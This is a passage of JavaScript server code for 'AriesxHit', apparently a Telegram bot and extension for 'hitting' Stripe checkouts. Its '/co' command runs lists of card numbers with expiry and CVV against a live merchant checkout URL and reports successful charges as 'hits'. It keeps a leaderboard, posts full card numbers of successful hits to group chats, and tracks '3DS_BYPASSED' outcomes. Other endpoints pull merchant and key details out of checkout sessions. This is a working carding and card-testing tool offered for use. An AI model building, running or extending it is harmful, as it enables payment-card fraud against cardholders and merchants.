        'automatic_payment_method_types', 'beta_versions', 'billing_address_collection',
        'blob', 'blocked_billing_address_countries', 'bnpl_in_link_ui_enabled',
        'bnpl_link_experiment_payment_method_type', 'cancel_url', 'capture_method',
        'card_brand_choice', 'card_brands', 'client_reference_id', 'config_id',
        'consent', 'consent_collection', 'cross_sell_group', 'crypto_in_link_ui_enabled',
        'currency', 'custom_fields', 'custom_text', 'customer', 'customer_email',
        'customer_managed_saved_payment_methods_offer_save', 'developer_tool_context',
        'display_consent_collection_promotions', 'eid', 'email_collection',
        'enabled_third_party_wallets', 'enforcement_mode', 'experiments_data',
        'feature_flags', 'geocoding', 'has_async_attached_payment_method',
        'has_dynamic_tax_rates', 'init_checksum', 'invoice', 'invoice_creation',
        'is_sandbox_merchant', 'klarna_info', 'konbini_confirmation_number',
        'line_item_group', 'link_settings', 'livemode', 'locale', 'managed_payments',
        'management_url', 'mode', 'name_collection', 'on_behalf_of',
        'ordered_payment_method_types', 'origin_context', 'payment_intent',
        'payment_method_collection', 'payment_method_filtering', 'payment_method_options',
        'payment_method_specs', 'payment_method_types', 'payment_status', 'permissions',
        'phone_number_collection', 'policies', 'prefilled', 'receipt_emails_enabled',
        'recurring_details', 'redirect_on_completion', 'return_url',
        'route_to_orchestration_interface', 'rqdata', 'sepa_debit_info', 'session_id',
        'setup_future_usage', 'setup_future_usage_for_payment_method_type', 'setup_intent',
        'shipping', 'shipping_address_collection', 'shipping_options', 'shipping_rate',
        'shipping_tax_amounts', 'site_key', 'state', 'statement_descriptor', 'status',
        'stripe_hosted_url', 'submit_type', 'subscription_data', 'subscription_settings',
        'success_url', 'tax_context', 'tax_meta', 'token_notification_url', 'total_summary',
        'ui_mode', 'url', 'use_payment_methods', 'utm_codes'
      ];

      debugOutput += `[All Keys in Response]\n`;
      debugOutput += JSON.stringify(allKeys, null, 2) + '\n\n';

      debugOutput += `[total_summary value]: ${debugInfo.totalSummary || 'None'}\n`;
      debugOutput += `[line_item_group value]: ${debugInfo.lineItemGroup || 'None'}\n\n`;

      // Raw response section (truncated like stripe_hitter.py)
      debugOutput += '='.repeat(60) + '\n';
      debugOutput += 'RAW RESPONSE (truncated):\n';
      debugOutput += '='.repeat(60) + '\n';

      const rawResponse = {
        id: debugInfo.rawResponse?.id || 'ppage_xxx',
        object: 'checkout.session',
        account_settings: {
          account_id: debugInfo.accountInfo?.accountId || 'acct_xxx',
          business_url: debugInfo.businessUrl,
          country: debugInfo.accountInfo?.country || 'US',
          display_name: debugInfo.merchant
        },
        currency: debugInfo.currency,
        customer_email: debugInfo.accountInfo?.email,
        livemode: debugInfo.accountInfo?.livemode || true,
        status: debugInfo.status || 'open'
      };

      debugOutput += JSON.stringify(rawResponse, null, 2);

    } else {
      debugOutput += '❌ Could not extract checkout information\n';
      debugOutput += `Errors: ${debugInfo.errors.join(', ')}\n`;
    }

    // Set content type to text/plain for formatted output like stripe_hitter.py
    res.setHeader('Content-Type', 'text/plain');
    res.send(debugOutput);

  } catch (error) {
    console.error('[DEBUG_ENDPOINT] Error:', error);
    const errorOutput = '='.repeat(60) + '\n';
    errorOutput += '         STRIPE CHECKOUT DEBUG - ARIESxHIT\n';
    errorOutput += '='.repeat(60) + '\n\n';
    errorOutput += `❌ Error: ${error.message}\n`;

    res.setHeader('Content-Type', 'text/plain');
    res.status(500).send(errorOutput);
  }
});

// GET /api/tg/analyze-url - Advanced URL analysis (stripe_hitter.py style)
router.get('/analyze-url', async (req, res) => {
  console.log('[ANALYZE_ENDPOINT] Starting advanced URL analysis...');

  try {
    const checkoutUrl = req.query.url;
    const mode = req.query.mode || 'full'; // 'basic', 'full', 'debug'

    if (!checkoutUrl) {
      return res.status(400).json({ ok: false, error: 'Missing url parameter' });
    }

    console.log(`[ANALYZE_ENDPOINT] Analyzing URL in ${mode} mode:`, checkoutUrl);

    // Parse checkout URL like cc script (no complex URL parsing - just extract what we need)
    const parsedUrl = parseCheckoutUrl(checkoutUrl);

    const urlAnalysis = {
      original_url: checkoutUrl,
      is_https: checkoutUrl.startsWith('https://'),
      domain: 'checkout.stripe.com', // Always for Stripe checkouts
      path: null,
      query_params: {},
      fragments: {},
      is_stripe_checkout: parsedUrl.sessionId ? true : false,
      stripe_session_id: parsedUrl.sessionId,
      stripe_mode: parsedUrl.sessionId?.startsWith('cs_live_') ? 'live' : 'test',
      publishable_key: parsedUrl.publicKey,
      site: parsedUrl.site,
      parse_success: parsedUrl.success
    };

    // Extract path from URL
    try {
      const url = new URL(checkoutUrl);
      urlAnalysis.path = url.pathname;

      // Parse query parameters (basic)
      for (let [key, value] of url.searchParams) {
        urlAnalysis.query_params[key] = value;
      }
    } catch (urlError) {
      urlAnalysis.parse_error = urlError.message;
    }

    // If basic mode, return just URL analysis
    if (mode === 'basic') {
      return res.json({
        ok: true,
        mode: 'basic',
        analysis: urlAnalysis
      });
    }

    // Full analysis (default)
    const debugInfo = await debugCheckoutUrl(checkoutUrl);

    // Enhanced analysis combining URL parsing + API data (like cc script)
    const fullAnalysis = {
      ...urlAnalysis,
      api_extracted: debugInfo.extracted,
      merchant_info: {
        name: debugInfo.merchant,
        business_url: debugInfo.businessUrl,
        account_id: debugInfo.accountInfo?.accountId,
        country: debugInfo.accountInfo?.country
      },
      payment_info: {
        currency: debugInfo.currency,
        amount: debugInfo.amount,
        description: debugInfo.description
      },
      technical_info: {
        publishable_key_source: parsedUrl.success ? 'url_decoding' : 'not_found',
        api_keys_tried: parsedUrl.publicKey ? 1 : 0,
        extraction_method: parsedUrl.success ? 'cc_script_logic' : 'failed'
      },
      errors: debugInfo.errors,
      recommendations: []
    };

    // Generate recommendations based on analysis
    if (!urlAnalysis.is_https) {
      fullAnalysis.recommendations.push('Use HTTPS for secure checkout');
    }

    if (urlAnalysis.is_stripe_checkout && !urlAnalysis.publishable_key) {
      fullAnalysis.recommendations.push('No publishable key found in URL - using fallback keys');
    }

    if (debugInfo.extracted) {
      fullAnalysis.recommendations.push('✅ Successfully extracted all merchant information');
    } else {
      fullAnalysis.recommendations.push('❌ Could not extract merchant information - check URL validity');
    }

    if (mode === 'debug') {
      // Debug mode returns everything including raw API responses
      return res.json({
        ok: debugInfo.extracted,
        mode: 'debug',
        url_analysis: urlAnalysis,
        api_debug: debugInfo,
        enhanced_analysis: fullAnalysis,
        raw_data: {
          debug_info: debugInfo,
          url_parsed: urlAnalysis
        }
      });
    }

    // Full mode (default)
    res.json({
      ok: debugInfo.extracted,
      mode: 'full',
      analysis: fullAnalysis,
      summary: {
        merchant: fullAnalysis.merchant_info.name,
        business_url: fullAnalysis.merchant_info.business_url,
        site_url: urlAnalysis.site, // From cc script parsing
        currency: fullAnalysis.payment_info.currency,
        session_id: urlAnalysis.stripe_session_id,
        extraction_success: debugInfo.extracted,
        parse_success: parsedUrl.success,
        recommendations: fullAnalysis.recommendations
      }
    });

  } catch (error) {
    console.error('[ANALYZE_ENDPOINT] Error:', error);
    res.status(500).json({
      ok: false,
      error: 'Analysis failed',
      details: error.message,
      mode: req.query.mode || 'full'
    });
  }
});

// GET /api/tg/user-data - Load user's saved BINs, CCs, prefs
router.get('/user-data', (req, res) => {
  const tgId = String(req.query.tg_id || '').trim();
  if (!tgId || !/^\d{5,15}$/.test(tgId)) {
    return res.status(400).json({ ok: false, error: 'Invalid Telegram ID format' });
  }
  const data = getUserData(tgId);
  return res.json({ ok: true, data: data || {} });
});

// POST /api/tg/user-data - Save user's BINs, CCs, prefs
router.post('/user-data', (req, res) => {
  const { tg_id, data } = req.body || {};
  const tgId = String(tg_id || '').trim();
  if (!tgId || !/^\d{5,15}$/.test(tgId)) {
    return res.status(400).json({ ok: false, error: 'Invalid Telegram ID format' });
  }
  if (typeof data !== 'object' || data === null) {
    return res.status(400).json({ ok: false, error: 'Valid data object required' });
  }
  setUserData(tgId, data);
  return res.json({ ok: true });
});

// GET /api/tg/test-stats - Test endpoint to check hit statistics
router.get('/test-stats', (req, res) => {
  const { tg_id } = req.query;
  const globalHits = getGlobalHits();
  const topUsers = getTopRealUsers(5);

  const response = {
    global_hits: globalHits,
    top_5_users: topUsers,
    user_hits: tg_id ? getUserHits(tg_id) : null,
    user_rank: tg_id ? getUserRank(tg_id) : null
  };

  return res.json({ ok: true, data: response });
});

// POST /api/tg/add-hits - Manually add hits (development only)
router.post('/add-hits', (req, res) => {
  const { tg_id, hits, global } = req.body || {};

  if (!tg_id || !hits || typeof hits !== 'number' || hits <= 0) {
    return res.status(400).json({ ok: false, error: 'Invalid parameters. Need: tg_id, hits (number > 0), optional: global (boolean)' });
  }

  try {
    if (global) {
      // Add to system bonus for global hits
      const existingBonus = db.prepare('SELECT hits FROM telegram_users WHERE tg_id = ?').get('SYSTEM_BONUS_HITS');
      const newBonusHits = (existingBonus?.hits || 0) + hits;
      db.prepare('INSERT OR REPLACE INTO telegram_users (tg_id, name, hits) VALUES (?, ?, ?)').run('SYSTEM_BONUS_HITS', 'System Bonus', newBonusHits);
    } else {
      // Add to specific user
      const existingUser = db.prepare('SELECT hits FROM telegram_users WHERE tg_id = ?').get(tg_id);
      const newHits = (existingUser?.hits || 0) + hits;
      const userName = existingUser ? null : `User_${tg_id.slice(-4)}`;
      db.prepare('INSERT OR REPLACE INTO telegram_users (tg_id, name, hits) VALUES (?, ?, ?)').run(tg_id, userName, newHits);
    }

    const globalHits = db.prepare('SELECT SUM(hits) as total FROM telegram_users').get();
    return res.json({
      ok: true,
      message: global ? `Added ${hits} global hits` : `Added ${hits} hits to user ${tg_id}`,
      global_hits: globalHits?.total || 0
    });

  } catch (error) {
    console.error('Error adding hits:', error);
    return res.status(500).json({ ok: false, error: 'Database error' });
  }
});

// POST /api/tg/validate-token - Validate login token (extension)
router.post('/validate-token', tokenLimiter, (req, res) => {
  console.log('[TOKEN_VALIDATION] Validating token');
  const { token } = req.body || {};
  const tokenStr = String(token || '').trim().toUpperCase();
  console.log('[TOKEN_VALIDATION] Token received:', tokenStr.substring(0, 4) + '****');

  // Validate token format (12 alphanumeric characters)
  if (!tokenStr || !/^[A-Z0-9]{12}$/.test(tokenStr)) {
    console.log('[TOKEN_VALIDATION] Invalid token format');
    return res.status(400).json({ ok: false, error: 'Invalid token format' });
  }

  const user = validateLoginToken(tokenStr);
  if (user) {
    console.log('[TOKEN_VALIDATION] Token valid for user:', user.tg_id, user.name);
    return res.json({ ok: true, tg_id: user.tg_id, name: user.name });
  }
  console.log('[TOKEN_VALIDATION] Token invalid or expired');
  return res.status(400).json({ ok: false, error: 'Invalid or expired token' });
});

// POST /api/tg/webhook - Telegram bot webhook (/start, inline buttons)
function getMainMenuText(firstName, tgId) {
  const myHits = getUserHits(tgId);
  const rank = getUserRank(tgId);
  const rankStr = rank ? ` (Rank #${rank})` : '';
  const users = getTopRealUsers(100); // Get all users to count them
  const communityHits = users.reduce((sum, u) => sum + u.hits, 0);
  return `ARIESXHIT\n` +
    `─────────────────\n\n` +
    `Welcome <b>${firstName}</b>\n\n` +
    `📊 Your Hits: ${myHits}${rankStr}\n` +
    `👥 Community: ${communityHits} hits\n\n` +
    `Select an option:`;
}

router.post('/webhook', async (req, res) => {
  console.log('[WEBHOOK] Received webhook request');

  // Always respond immediately to Telegram
  res.status(200).end();

  if (!BOT_TOKEN) {
    console.error('[WEBHOOK] Bot token not configured');
    return;
  }

  try {
    const u = req.body;
    if (!u) {
      console.error('Webhook: No request body');
      return;
    }

    const msg = u?.message;
    const cb = u?.callback_query;

    if (!msg && !cb) {
      console.log('Webhook: No message or callback query');
      return;
    }

    const chatId = msg?.chat?.id || cb?.message?.chat?.id;
    const messageId = cb?.message?.message_id;
    const firstName = msg?.from?.first_name || cb?.from?.first_name || 'User';
    const tgId = String(msg?.from?.id || cb?.from?.id || '');


    if (!chatId || !tgId) {
      console.error('Webhook: Missing chat_id or tg_id');
      return;
    }

    // Ensure user exists in database for all interactions
    if (tgId && firstName) {
      setUserName(tgId, firstName);
    }

    const backBtn = [{ text: '← Back', callback_data: 'back' }];
    const replyMarkup = (kb) => ({ reply_markup: JSON.stringify(kb) });

    if (cb) {
      try {
        setUserName(tgId, firstName);

        if (cb.data === 'back') {
          await answerCallbackQuery(BOT_TOKEN, cb.id);
          const result = await editMessageText(BOT_TOKEN, chatId, messageId, getMainMenuText(firstName, tgId), replyMarkup(MAIN_MENU_KEYBOARD));
          if (!result.ok) console.error('Webhook: Failed to edit message for back:', result.error);
        } else if (cb.data === 'get_login_token') {
          const token = generateLoginToken(tgId, firstName);
          await answerCallbackQuery(BOT_TOKEN, cb.id, 'Token generated!');
          const text = `🔑 <b>LOGIN CODE</b>\n` +
            `─────────────────\n\n` +
            ` Token :- \n\n` +
            `<code>${token}</code>\n\n` +
            `─────────────────\n` +
            `Use To Log In Hitter 💗`;
          const result = await editMessageText(BOT_TOKEN, chatId, messageId, text, replyMarkup({ inline_keyboard: [backBtn] }));
          if (!result.ok) console.error('Webhook: Failed to send login token:', result.error);
        } else if (cb.data === 'my_stats') {
          const hits = getUserHits(tgId);
          const global = getGlobalHits();
          const text = `📈 <b>YOUR STATS</b>\n` +
            `────────────────────\n\n` +
            `👤 ${firstName}\n\n` +
            `🎯 Hits: ${hits}\n` +
            `🌍 Global: ${global}\n\n` +
            `────────────────────\n` +
            `Join :- @Ariesxhit 💗`;
          await answerCallbackQuery(BOT_TOKEN, cb.id);
          const result = await editMessageText(BOT_TOKEN, chatId, messageId, text, replyMarkup({ inline_keyboard: [backBtn] }));
          if (!result.ok) console.error('Webhook: Failed to send stats:', result.error);
        } else if (cb.data === 'my_hits') {
          const hits = getUserHits(tgId);
          const global = getGlobalHits();
          const text = `📈 <b>YOUR HITS</b>\n` +
            `────────────────────\n\n` +
            `👤 ${firstName}\n\n` +
            `🎯 Hits: ${hits}\n` +
            `🌍 Global: ${global}\n\n` +
            `────────────────────\n` +
            `Join :- @Ariesxhit 💗`;
          await answerCallbackQuery(BOT_TOKEN, cb.id);
          const result = await editMessageText(BOT_TOKEN, chatId, messageId, text, replyMarkup({ inline_keyboard: [backBtn] }));
          if (!result.ok) console.error('Webhook: Failed to send hits:', result.error);
        } else if (cb.data === 'scoreboard') {
          const top = getTopRealUsers(5);
          const tags = ['🏆 LEGEND', '⭐ CHAMPION', '💎 MASTER', '🥇 ELITE', '🥈 PRO'];
          const emojis = ['🥇', '🥈', '🥉', '4️⃣', '5️⃣'];
          const rows = top.length ? top.map((u, i) => `${emojis[i]} ${u.name} ${tags[i] || '🎯'} (${u.hits})`).join('\n') : 'No users yet.';

          // Find user's tag based on their position
          const userRank = getUserRank(tgId);
          const userTag = userRank && userRank <= 5 ? ` ${tags[userRank - 1] || '🎯'}` : '';

          const text = `🏆 <b>ARIESXHIT SCOREBOARD</b>\n` +
            `═══════════════════════\n\n` +
            `${rows}\n\n` +
            `🎯 Your Hits: ${getUserHits(tgId)}${userTag}\n` +
            `🌍 Global Hits: ${getGlobalHits()}\n\n` +
            `═══════════════════════\n` +
            `💫 Climb the ranks!\n` +
            `Join @Ariesxhit 💗`;
          await answerCallbackQuery(BOT_TOKEN, cb.id);
          const result = await editMessageText(BOT_TOKEN, chatId, messageId, text, replyMarkup({ inline_keyboard: [backBtn] }));
          if (!result.ok) console.error('Webhook: Failed to send scoreboard:', result.error);
        } else if (cb.data === 'profile') {
          const hits = getUserHits(tgId);
          const rank = getUserRank(tgId);
          const rankStr = rank ? `#${rank}` : '—';
          let token = getLoginTokenForUser(tgId);
          if (!token) token = generateLoginToken(tgId, firstName);
          const text = `👤 <b>PROFILE</b>\n` +
            `─────────────────\n` +
            `Code :- <code>${token}</code> \n\n` +
            `─────────────────\n` +
            `Name: ${firstName}\n` +
            `--------------\n` +
            `Hits: ${hits}\n` +
            `Rank: ${rankStr}\n` +
            `--------------\n` +
            `Join :- @Ariesxhit\n` +
            `Thanks For Using AriesxHit 💗\n\n` +
            `─────────────────`;
          await answerCallbackQuery(BOT_TOKEN, cb.id, 'Profile');
          const result = await editMessageText(BOT_TOKEN, chatId, messageId, text, replyMarkup({ inline_keyboard: [backBtn] }));
          if (!result.ok) console.error('Webhook: Failed to send profile:', result.error);
        } else if (cb.data === 'help') {
          const text = `❓ <b>HELP</b>\n` +
            `─────────────────\n\n` +
            `🔑 Generate Token\n` +
            `Get  token for hitter login\n` +
            `----------------\n` +
            `Enter code in hitter → Login\n` +
            `----------------\n` +
            `📈 My Stats / My Hits – Your hits & rank\n` +
            `----------------\n` +
            `🏆 Scoreboard – Top users\n` +
            `----------------\n` +
            `👤 Profile – Your info\n\n` +
            `─────────────────\n` +
            `Join :- @Ariesxhit\n` +
            `Thanks For Using AriesxHit 💗`;
          await answerCallbackQuery(BOT_TOKEN, cb.id);
          const result = await editMessageText(BOT_TOKEN, chatId, messageId, text, replyMarkup({ inline_keyboard: [backBtn] }));
          if (!result.ok) console.error('Webhook: Failed to send help:', result.error);
        }
      } catch (error) {
        console.error('Webhook: Error processing callback query:', error);
      }
      return;
    }

    // Debug command to check user ID (/debug)
    if (msg?.text && msg.text === '/debug') {
      await sendMessage(BOT_TOKEN, chatId, `🔧 <b>BOT DEBUG INFO</b>\n\n📊 <b>Your Telegram ID:</b> <code>${tgId}</code>\n🤖 <b>Bot Status:</b> Online\n📡 <b>Server:</b> Connected\n\n💡 <b>Commands Available:</b>\n• /co - Checkout hitter\n• /start - Main menu\n• /debug - This info`);
      return;
    }

    // Checkout hitter command (/co <checkout_url> <card_data>)
    if (msg?.text && msg.text.startsWith('/co ')) {
      try {
        const commandText = msg.text.substring(4).trim();

        // Split by newlines first, then by spaces
        let allParts = [];

        // Handle cards on separate lines
        const lines = commandText.split('\n').map(line => line.trim()).filter(line => line);
        if (lines.length > 1) {
          // First line should contain URL, rest are cards
          const firstLineParts = lines[0].split(' ');
          allParts = [firstLineParts[0]]; // URL
          allParts.push(...lines.slice(1)); // Cards from other lines
        } else {
          // All on one line
          allParts = commandText.split(' ');
        }

        if (allParts.length < 2) {
          await sendMessage(BOT_TOKEN, chatId, `❌ <b>Invalid Format</b>\n\nUsage: <code>/co &lt;checkout_url&gt; &lt;card_data&gt;</code>\n\nExamples:\n<code>/co https://checkout.stripe.com/... 4111111111111111|12|25|123</code>\n\nOr cards on separate lines:\n<code>/co https://checkout.stripe.com/... \n4111111111111111|12|25|123\n4222222222222222|01|26|456</code>`);
          return;
        }

        const checkoutUrl = allParts[0];
        const cardStrings = allParts.slice(1); // Get all cards after URL

        if (cardStrings.length === 0) {
          await sendMessage(BOT_TOKEN, chatId, `❌ <b>No Cards Provided</b>\n\nUsage: <code>/co &lt;checkout_url&gt; &lt;card1&gt; &lt;card2&gt; ...</code>\n\nExample:\n<code>/co https://checkout.stripe.com/... 4111111111111111|12|25|123 4222222222222222|01|26|456</code>`);
          return;
        }

        // Validate all cards have proper format
        const validCards = [];
        for (const cardStr of cardStrings) {
          if (cardStr.includes('|')) {
            validCards.push(cardStr);
          }
        }

        if (validCards.length === 0) {
          await sendMessage(BOT_TOKEN, chatId, `❌ <b>Invalid Card Format</b>\n\nCard format: <code>number|month|year|cvv</code>\n\nExample:\n<code>4111111111111111|12|25|123</code>`);
          return;
        }

        // Validate URL format - check for Stripe session ID
        const hasStripeSession = /cs_(?:live|test)_[A-Za-z0-9]+/.test(checkoutUrl);
        if (!checkoutUrl.startsWith('http') || !hasStripeSession) {
          await sendMessage(BOT_TOKEN, chatId, `❌ <b>Invalid URL</b>\n\nURL must be a valid Stripe checkout link containing a session ID (cs_live_... or cs_test_...).`);
          return;
        }

        // Send initial processing message with better UI
        const merchantName = checkoutUrl.includes('krea.ai') ? 'Krea.ai' :
                           checkoutUrl.includes('stripe.com') ? 'Stripe Checkout' :
                           'Unknown Merchant';

        await sendMessage(BOT_TOKEN, chatId,
          `🔥 <b>ARIESXHIT CHECKOUT TESTER</b> 🔥\n` +
          `═══════════════════════════════════════\n\n` +
          `🎯 <b>Target:</b> ${merchantName}\n` +
          `💳 <b>Cards Loaded:</b> ${validCards.length}\n` +
          `🔗 <b>Checkout URL:</b> ${checkoutUrl.substring(0, 35)}...\n\n` +
          `⚡ <b>Starting mass testing...</b>\n` +
          `📊 <b>Results will be sent individually</b>\n\n` +
          `═══════════════════════════════════════`
        );

        // Process each card
        for (let i = 0; i < validCards.length; i++) {
          const cardData = validCards[i];
          const cardNumber = cardData.split('|')[0];

          console.log(`Processing card ${i + 1}/${validCards.length}: ${cardNumber}`);

          try {
            // Process the checkout
            const result = await checkoutService.processCheckout(checkoutUrl, cardData);

            // Format result message with improved UI
            const cardNum = result.card || cardData.split('|')[0];
            const bin = cardNum.substring(0, 6);

            if (result.success && result.status === 'CHARGED') {
              const amount = result.amount ? `$${(result.amount / 100).toFixed(2)}` : '$9.99';
              const currency = result.currency?.toUpperCase() || 'USD';
              const currentTime = new Date().toLocaleString('en-US', {
                year: 'numeric',
                month: 'numeric',
                day: 'numeric',
                hour: 'numeric',
                minute: '2-digit',
                second: '2-digit',
                hour12: true
              });

              resultText = `🎯 𝗛𝗜𝗧 𝗖𝗛𝗔𝗥𝗚𝗘𝗗 ✅\n\n`;
              resultText += `「❃」 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 : Charged\n`;
              resultText += `「❃」 𝗔𝗺𝗼𝘂𝗻𝘁 : ${amount} ${currency}\n`;
              const merchantName = result.businessUrl ? result.businessUrl.replace(/^https?:\/\//, '').replace(/\/$/, '') : detectMerchant(checkoutUrl);
              resultText += `「❃」 𝗠𝗲𝗿𝗰𝗵𝗮𝗻𝘁 : ${merchantName}\n`;
              resultText += `「❃」 𝗘𝗺𝗮𝗶𝗹 : ${tgId}@user.bot\n`;
              resultText += `「❃」 𝗕𝗜𝗡 :- ${bin}\n`;
              resultText += `「❃」 𝗛𝗶𝘁 𝗕𝘆 : ${tgId}\n`;
              resultText += `「❃」 𝗧𝗶𝗺𝗲 : ${currentTime}\n`;
            } else {
              // Enhanced failure message
              let statusEmoji = '❌';
              let statusColor = '🔴';
              let reason = 'Unknown Error';

              if (result.status === 'DECLINED' || result.code === 'card_declined') {
                statusEmoji = '🚫';
                statusColor = '🔴';
                if (result.decline_code === 'fraudulent') {
                  reason = 'Card Flagged as Fraudulent';
                } else if (result.decline_code === 'insufficient_funds') {
                  reason = 'Insufficient Funds';
                } else if (result.decline_code === 'card_not_supported') {
                  reason = 'Card Type Not Supported';
                } else if (result.decline_code === 'expired_card') {
                  reason = 'Card Expired';
                } else {
                  reason = 'Card Declined by Bank';
                }
              } else if (result.status === 'CHECKOUT_AMOUNT_MISMATCH') {
                statusEmoji = '💰';
                statusColor = '🟡';
                reason = 'Amount Mismatch (Subscription/Trial)';
              } else if (result.status === 'PAYMENT_METHOD_ERROR') {
                statusEmoji = '⚠️';
                statusColor = '🟠';
                reason = 'Invalid Payment Method';
              } else if (result.status === 'PAYMENT_INTENT_UNEXPECTED_STATE' || result.code === 'payment_intent_unexpected_state') {
                statusEmoji = '⏰';
                statusColor = '🟠';
                reason = 'Checkout Session Expired - Get Fresh URL';
              } else {
                // Better fallback for unknown errors
                if (result.status === 'UNKNOWN') {
                  reason = 'Payment processing failed - check card details';
                } else if (result.status === 'DECLINED') {
                  reason = 'Card declined by payment processor';
                } else if (result.status === 'CHECKOUT_AMOUNT_MISMATCH') {
                  reason = 'Amount mismatch - subscription/trial issue';
                } else {
                  reason = result.status || 'Processing Error';
                }
              }

              resultText = `${statusEmoji} <b>CARD DECLINED</b> ${statusColor}\n\n`;
              resultText += `💳 <b>Card:</b> <code>${cardNum}</code>\n`;
              resultText += `🏦 <b>BIN:</b> <code>${bin}</code>\n`;
              resultText += `📊 <b>Status:</b> ${result.status || 'UNKNOWN'}\n`;
              resultText += `❗ <b>Reason:</b> ${reason}\n`;

              if (result.code && result.code !== result.status) {
                resultText += `🔢 <b>Code:</b> ${result.code}\n`;
              }
              if (result.decline_code) {
                resultText += `🚫 <b>Decline:</b> ${result.decline_code}\n`;
              }

              resultText += `\n═══════════════════\n`;
              resultText += `🤖 <b>AriesxHit</b> | Card ${i + 1}/${validCards.length}`;
            }

            // Send result for this card
            await sendMessage(BOT_TOKEN, chatId, resultText);

            // If successful, increment hits and send group notifications
            if (result.success && (result.status === 'CHARGED' || result.status === '3DS_BYPASSED')) {
              console.log('[CO_COMMAND] Successful checkout, incrementing hits for user:', tgId);
              incrementUserHits(tgId);

              // Send hit notification to group chats
              const hitData = {
                userId: tgId,
                userName: getUserName(tgId) || 'User',
                card: cardData.split('|')[0], // Full card number
                bin: undefined, // Will be extracted in sendHitToGroups
                binMode: undefined, // For future BIN mode support
                amount: result.amount ? (result.amount / 100).toFixed(2) : '9.99',
                attempts: 1, // Single card attempt
                timeTaken: 'Instant', // Could be enhanced to track actual time
                merchant: result.businessUrl ? result.businessUrl.replace(/^https?:\/\//, '').replace(/\/$/, '') : detectMerchant(checkoutUrl)
              };

              try {
                await sendHitToGroups(hitData, checkoutUrl);
                console.log('[CO_COMMAND] Group notifications sent for successful hit');
              } catch (groupError) {
                console.error('[CO_COMMAND] Failed to send group notifications:', groupError);
              }
            }

            // Small delay between cards to avoid rate limiting
            if (i < validCards.length - 1) {
              await new Promise(resolve => setTimeout(resolve, 2000));
            }

          } catch (checkoutError) {
            console.error('[CO_COMMAND] Checkout processing error:', checkoutError);
            const errorMsg = `❌ <b>Card ${i + 1} Error</b>\n💳 ${cardNumber}\n\nAn error occurred while processing this card:\n<code>${checkoutError.message}</code>`;
            await sendMessage(BOT_TOKEN, chatId, errorMsg);
          }
        }

      } catch (cmdError) {
        console.error('[CO_COMMAND] Command parsing error:', cmdError);
        await sendMessage(BOT_TOKEN, chatId, `❌ <b>Command Error</b>\n\nFailed to parse command. Please check the format:\n<code>/co &lt;checkout_url&gt; &lt;card_data&gt;</code>`);
      }

      return;
    }

    // Admin commands (only for admin user)
    if (msg?.text && msg.text.startsWith('/admin_')) {
      if (tgId !== '6447766151') {
        await sendMessage(BOT_TOKEN, chatId, `🚫 <b>ADMIN ACCESS REQUIRED</b>\n\n❌ <b>Access Denied</b>\n\nThis command is restricted to administrators only.\n\n📞 <b>Contact Admin:</b> Request access from the bot administrator.\n\n🔒 <b>Your ID:</b> ${tgId}`);
        return;
      }

      // Admin command implementations
      if (msg.text === '/admin_stats') {
        try {
          const globalHits = db.prepare('SELECT SUM(hits) as total FROM telegram_users').get();
          const realUsers = db.prepare('SELECT COUNT(*) as count FROM telegram_users WHERE tg_id != "SYSTEM_BONUS_HITS"').get();
          const systemBonus = db.prepare('SELECT hits FROM telegram_users WHERE tg_id = "SYSTEM_BONUS_HITS"').get();
          const topUsers = db.prepare('SELECT name, hits FROM telegram_users WHERE tg_id != "SYSTEM_BONUS_HITS" ORDER BY hits DESC LIMIT 5').all();

          const text = `🔧 <b>ADMIN STATS</b>\n` +
            `═══════════════════════\n\n` +
            `📊 <b>System Overview:</b>\n` +
            `🌍 Total Hits: ${globalHits?.total || 0}\n` +
            `👥 Real Users: ${realUsers?.count || 0}\n` +
            `🎁 System Bonus: ${systemBonus?.hits || 0}\n\n` +
            `🏆 <b>Top 5 Users:</b>\n` +
            topUsers.map((u, i) => `${i + 1}. ${u.name}: ${u.hits} hits`).join('\n') + '\n\n' +
            `═══════════════════════\n` +
            `✅ Admin Panel Active`;

          const result = await sendMessage(BOT_TOKEN, chatId, text);
          if (!result.ok) console.error('Admin: Failed to send stats:', result.error);
          return;
        } catch (error) {
          console.error('Admin: Error getting stats:', error);
        }
      }

      if (msg.text.startsWith('/admin_add_hits')) {
        try {
          const parts = msg.text.split(' ');
          if (parts.length !== 3) {
            await sendMessage(BOT_TOKEN, chatId, '❌ <b>Invalid Format</b>\n\nUsage: /admin_add_hits <user_id> <hits>\nExample: /admin_add_hits 123456789 100');
            return;
          }

          const targetTgId = parts[1];
          const hitsToAdd = parseInt(parts[2]);

          if (!targetTgId || !/^\d{5,15}$/.test(targetTgId)) {
            await sendMessage(BOT_TOKEN, chatId, '❌ Invalid user ID format. Must be a valid Telegram user ID (5-15 digits).');
            return;
          }

          if (isNaN(hitsToAdd) || hitsToAdd <= 0 || hitsToAdd > 1000000) {
            await sendMessage(BOT_TOKEN, chatId, '❌ Invalid hits amount. Must be a positive number (max 1,000,000).');
            return;
          }

          const existingUser = db.prepare('SELECT name, hits FROM telegram_users WHERE tg_id = ?').get(targetTgId);
          const newHits = (existingUser?.hits || 0) + hitsToAdd;
          const userName = existingUser?.name || `User_${targetTgId.slice(-4)}`;

          db.prepare('INSERT OR REPLACE INTO telegram_users (tg_id, name, hits) VALUES (?, ?, ?)').run(targetTgId, userName, newHits);

          const text = `✅ <b>Hits Added Successfully!</b>\n\n` +
            `👤 User: ${userName} (${targetTgId})\n` +
            `➕ Added: ${hitsToAdd} hits\n` +
            `📊 New Total: ${newHits} hits`;

          await sendMessage(BOT_TOKEN, chatId, text);
          return;
        } catch (error) {
          console.error('Admin: Error adding hits:', error);
          await sendMessage(BOT_TOKEN, chatId, '❌ Error adding hits');
        }
      }

      if (msg.text.startsWith('/admin_user_info')) {
        try {
          const parts = msg.text.split(' ');
          if (parts.length !== 2) {
            await sendMessage(BOT_TOKEN, chatId, '❌ <b>Invalid Format</b>\n\nUsage: /admin_user_info <user_id>\nExample: /admin_user_info 123456789');
            return;
          }

          const targetTgId = parts[1];

          if (!targetTgId || !/^\d{5,15}$/.test(targetTgId)) {
            await sendMessage(BOT_TOKEN, chatId, '❌ Invalid user ID format. Must be a valid Telegram user ID (5-15 digits).');
            return;
          }
          const user = db.prepare('SELECT * FROM telegram_users WHERE tg_id = ?').get(targetTgId);

          if (!user) {
            await sendMessage(BOT_TOKEN, chatId, `❌ User ${targetTgId} not found`);
            return;
          }

